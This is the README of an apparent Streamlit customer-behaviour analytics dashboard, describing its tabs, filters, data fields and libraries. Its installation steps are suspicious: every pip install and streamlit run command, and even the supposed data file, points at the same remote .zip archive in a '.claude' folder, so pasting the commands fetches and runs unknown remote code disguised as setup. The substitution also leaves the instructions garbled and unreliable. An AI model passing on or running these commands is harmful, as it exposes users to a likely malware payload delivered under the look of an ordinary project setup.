# Customer Behavior Analytics Dashboard

A comprehensive Streamlit dashboard for analyzing customer purchase patterns and behavior.

## Features

### 📊 Overview
- Purchase distribution by category and season
- Top 10 items purchased
- Top 10 customer locations
- Interactive pie charts and bar graphs

### 🛍️ Purchase Analysis
- Purchase amount distribution with box plots
- Average purchase by category
- Purchase patterns by season and category (sunburst chart)
- Purchase frequency analysis

### 👥 Customer Demographics
- Age distribution with statistics
- Gender distribution
- Age vs Purchase Amount correlation
- Previous purchases analysis

### 💰 Revenue Analysis
- Revenue breakdown by category, season, and location
- Revenue metrics (total, median, max, min)
- Top performing locations

### ⭐ Review Analytics
- Review rating distribution
- Average ratings by category and season
- Rating vs Purchase Amount correlation

### 📦 Shipping & Payment
- Shipping type preferences
- Payment method distribution
- Discount and promo code usage
- Product size distribution

### 👥 Customer Segmentation (Elite)
- RFM-like analysis (Frequency & Monetary)
- Interactive Customer Value Matrix
- Loyalty Tier distribution (New, Regular, Loyal, VIP)
- Segment profiling and business recommendations

### 🎁 Promotional Analysis (Elite)
- Statistical impact of discounts on AOV
- A/B testing framework visualization
- Distribution comparisons with box plots

### 🔮 Predictive Analytics (Elite)
- ML-powered K-Means customer clustering
- PCA (Principal Component Analysis) visualization
- Automated cluster profiling and insights

### 📊 Statistical Tests (Elite)
- Business hypothesis testing interface
- Mann-Whitney U tests for rigorous analysis
- Effect size (Cohen's d) calculations

## Interactive Filters

The dashboard includes comprehensive sidebar filters:
- **Gender**: Filter by Male/Female/All
- **Category**: Multi-select filter for product categories
- **Season**: Multi-select filter for seasons
- **Age Range**: Slider to filter by customer age
- **Purchase Amount**: Slider to filter by purchase amount
- **Loyalty Tier**: Filter by New, Regular, Loyal, or VIP
- **Value Segment**: Filter by Spending class (Low/Mid/High)
- **Subscription Status**: Filter by subscribers vs non-subscribers

## Installation

1. Install required dependencies:
```bash
pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
```

Or:
```bash
python -m pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
```

Run the following command from the project root:
```bash
streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
```

Or:
```bash
python -m streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
```

The dashboard will open in your default web browser at `http://localhost:8501`

## Data Structure

The dashboard analyzes the `https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip` file which contains:
- Customer ID
- Age
- Gender
- Item Purchased
- Category (Clothing, Footwear, Outerwear, Accessories)
- Purchase Amount (USD)
- Location (US States)
- Size (S, M, L, XL)
- Color
- Season (Winter, Spring, Summer, Fall)
- Review Rating (1-5)
- Subscription Status
- Shipping Type
- Discount Applied
- Promo Code Used
- Previous Purchases
- Payment Method
- Frequency of Purchases

## Technology Stack

- **Streamlit**: Web application framework
- **Pandas**: Data manipulation and analysis
- **Plotly**: Interactive visualizations
- **NumPy**: Numerical computing
- **SciPy**: Scientific computing (Statistical tests)
- **Scikit-learn**: Machine Learning (K-Means & PCA)
- **Statsmodels**: Ordinary Least Squares (OLS) trendlines

## Dashboard Highlights

- **Fully Interactive**: All charts are interactive with hover information
- **Responsive Design**: Works on different screen sizes
- **Real-time Filtering**: Instant updates when filters are changed
- **Professional Styling**: Clean, modern interface
- **Comprehensive Analytics**: 20+ visualizations across 6 different tabs

## Tips for Use

1. Start with the Overview tab to get a general understanding of the data
2. Use filters to focus on specific customer segments
3. Export charts by clicking the camera icon on each visualization
4. Compare different segments by adjusting filters
5. Look for patterns in Purchase Analysis and Revenue Analysis tabs

## Support

For questions or issues, please contact the development team.
